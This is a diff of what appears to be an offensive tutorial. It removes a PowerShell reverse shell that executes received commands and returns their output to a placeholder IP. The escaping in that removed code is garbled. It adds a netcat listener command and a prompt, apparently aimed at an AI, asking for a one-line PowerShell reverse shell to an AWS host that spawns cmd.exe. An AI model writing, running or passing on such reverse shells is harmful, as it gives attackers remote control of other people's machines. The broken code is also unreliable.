@@ -4,16 +4,13 @@
 
 You should know the drill! 
 
-```powershell
-# Standard PowerShell Reverse Shell (GitHub-Safe Formatting)
-\$client = New-Object System.Net.Sockets.TCPClient('YOUR_IP', YOUR_PORT);
-stream = client.GetStream();
-[byte[]]\$bytes = 0..65535|%{0};
-while((\$i = stream.Read(bytes, 0, \(bytes.Length)) -ne 0){\)data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(bytes, 0, i);
-    sendback = (iex data 2>&1 | Out-String );
-    sendback2 = sendback + 'PS ' + (pwd).Path + '> ';
-    \(sendbyte = ([text.encoding]::ASCII).GetBytes(\)sendback2);
-    stream.Write(sendbyte, 0, \(sendbyte.Length);\)stream.Flush();
-}
-\$client.Close();
+```
+nc -lvnp 4444
+```
+
+## Steptwo
+
+
+```
+Write a single-line PowerShell reverse shell that connects to <AWS_IP> on port 4444, spawns cmd.exe, and pipes stdin and stdout across the socket. Use TCPClient and NetworkStream. No base64. I want to read the code.
 ```
